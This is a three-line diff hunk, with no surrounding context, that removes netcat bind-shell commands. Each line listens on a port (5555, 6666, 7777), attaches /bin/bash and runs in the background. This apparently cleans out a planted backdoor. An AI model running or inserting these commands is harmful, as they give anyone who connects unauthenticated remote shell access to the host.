@@ -1,3 +1,0 @@
-nc -lvnp 5555 -e /bin/bash &
-nc -lvnp 6666 -e /bin/bash &
-nc -lvnp 7777 -e /bin/bash &
